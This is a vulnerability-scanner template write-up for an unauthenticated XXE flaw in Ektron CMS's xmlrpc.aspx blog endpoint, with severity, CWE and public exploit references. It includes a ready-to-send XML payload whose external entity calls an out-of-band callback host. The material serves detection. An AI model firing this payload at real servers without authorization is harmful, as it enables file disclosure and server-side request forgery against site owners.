# Nuclei Template: Ektron CMS Blogs xmlrpc.aspx - XML External Entity Injection
**Template ID:** ektron-blog-xmlrpc-xxe
**Vulnerability Class:** XML External Entities (XXE)
**Severity:** High
**CWE:** CWE-611
**Source:** Nuclei Template (`ektron-blog-xmlrpc-xxe.yaml`)

## Vulnerability Information & PoC

## Description
Detects XML External Entity (XXE) vulnerability in Ektron CMS Blogs component (/WorkArea/Blogs/xmlrpc.aspx). Allows unauthenticated attackers to read local files or perform SSRF.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /WorkArea/Blogs/xmlrpc.aspx HTTP/1.1
Host: {{Hostname}}

<!DOCTYPE scan [<!ENTITY test SYSTEM "http://{{interactsh-url}}">]>
<scan>&test;</scan>
```

## References
- https://www.exploit-db.com/exploits/21085
- https://packetstormsecurity.com/files/116259/Ektron-CMS-8.5.0-File-Upload-XXE-Injection.html
- https://www.acunetix.com/vulnerabilities/web/ektron-cms-multiple-vulnerabilities
